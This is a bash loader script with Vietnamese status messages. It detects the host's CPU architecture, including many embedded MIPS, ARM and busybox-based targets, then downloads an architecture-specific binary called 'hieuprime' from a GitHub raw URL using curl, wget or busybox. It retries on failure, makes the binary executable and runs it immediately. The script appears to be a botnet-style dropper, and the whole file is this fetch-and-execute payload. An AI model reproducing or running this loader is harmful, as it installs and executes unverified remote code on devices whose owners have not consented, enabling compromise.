#!/usr/bin/env bash
set -e

# ===== CONFIG =====
BASE_URL="https://raw.githubusercontent.com/mdn-gay/1239277489294m/main/bins"
BINARY_PREFIX="hieuprime"

# ===== ARCH DETECT =====
detect_arch() {
    ARCH_RAW="$(uname -m 2>/dev/null | tr '[:upper:]' '[:lower:]')"

    case "$ARCH_RAW" in
        386|i386|i486|i586|i686)
            echo "386"
            ;;
        amd64|x86_64)
            echo "amd64"
            ;;
        armv7l|armv7*|armhf|arm)
            echo "armv7"
            ;;
        armv6l|armv6*)
            echo "armv6"
            ;;
        armv5*)
            echo "armv5"
            ;;
        arm64|aarch64)
            echo "arm64"
            ;;
        mips)
            echo "mips"
            ;;
        mipsle|mipsel)
            echo "mipsle"
            ;;
        mips64)
            echo "mips64"
            ;;
        mips64le|mips64el)
            echo "mips64le"
            ;;
        ppc64)
            echo "ppc64"
            ;;
        ppc64le)
            echo "ppc64le"
            ;;
        s390x)
            echo "s390x"
            ;;
        riscv64|rv64*)
            echo "riscv64"
            ;;
        *)
            echo "unsupported"
            ;;
    esac
}

ARCH_SUFFIX="$(detect_arch)"

if [ "$ARCH_SUFFIX" = "unsupported" ]; then
    echo "[-] Kiến trúc không hỗ trợ: $(uname -m)"
    exit 1
fi

BINARY_NAME="${BINARY_PREFIX}_${ARCH_SUFFIX}"
TARGET_URL="${BASE_URL}/${BINARY_NAME}"

echo "[+] Kiến trúc phát hiện: $ARCH_SUFFIX"
echo "[+] File: $BINARY_NAME"
echo "[+] URL: $TARGET_URL"

# ===== DOWNLOAD TOOL =====
download() {
    if command -v curl >/dev/null 2>&1; then
        curl -L --fail --silent -o "$BINARY_NAME" "$TARGET_URL"
        return $?
    fi

    if command -v wget >/dev/null 2>&1; then
        wget -q -O "$BINARY_NAME" "$TARGET_URL"
        return $?
    fi

    if command -v busybox >/dev/null 2>&1; then
        if busybox wget --help >/dev/null 2>&1; then
            busybox wget -q -O "$BINARY_NAME" "$TARGET_URL"
            return $?
        fi
        if busybox curl --help >/dev/null 2>&1; then
            busybox curl -L --silent -o "$BINARY_NAME" "$TARGET_URL"
            return $?
        fi
    fi

    return 1
}

# ===== DOWNLOAD WITH RETRY =====
RETRY=0
MAX_RETRY=3

until download; do
    RETRY=$((RETRY + 1))
    if [ "$RETRY" -ge "$MAX_RETRY" ]; then
        echo "[-] Tải thất bại sau $MAX_RETRY lần"
        exit 1
    fi
    echo "[!] Retry $RETRY/$MAX_RETRY..."
    sleep 2
done

chmod +x "$BINARY_NAME"

echo "[+] Tải xong, đang chạy..."
exec "./$BINARY_NAME"